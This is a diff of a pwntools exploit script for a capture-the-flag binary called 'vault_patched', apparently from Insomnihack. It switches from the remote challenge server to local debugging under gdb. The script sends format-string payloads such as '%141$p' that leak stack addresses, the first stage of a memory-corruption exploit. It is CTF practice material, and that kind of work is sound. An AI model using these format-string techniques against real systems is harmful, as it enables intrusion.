@@ -3,17 +3,17 @@ from pwn import *
 exe = ELF('./vault_patched')
 libc = ELF('./libc.so.6')
 ld = ELF('./ld-2.35.so')
-# p = process(exe.path)
-p = remote("vaulty.insomnihack.ch",4556) 
-# context.terminal = ['alacritty','-e']
-# gdb.attach(p, gdbscript='''
-# # b*0x126f + 0x0000555555554000
-# #            b*0x129d + 0x0000555555554000
-#              # b*0x12d0 + 0x0000555555554000
-#  # b*0x17ad + 0x0000555555554000
-#            # b*0x1479 + 0x0000555555554000
-#             # b*0x1501 + 0x0000555555554000
-#            ''')
+p = process(exe.path)
+# p = remote("vaulty.insomnihack.ch",4556) 
+context.terminal = ['alacritty','-e']
+gdb.attach(p, gdbscript='''
+# b*0x126f + 0x0000555555554000
+#            b*0x129d + 0x0000555555554000
+             b*0x12d0 + 0x0000555555554000
+ # b*0x17ad + 0x0000555555554000
+           # b*0x1479 + 0x0000555555554000
+            # b*0x1501 + 0x0000555555554000
+           ''')
 p.sendlineafter(b'choice (1-5):',  b'1')
 p.sendlineafter(b'Username:',  b'%141$p')
 p.sendlineafter(b'Password:',  b'lmao%12$p')
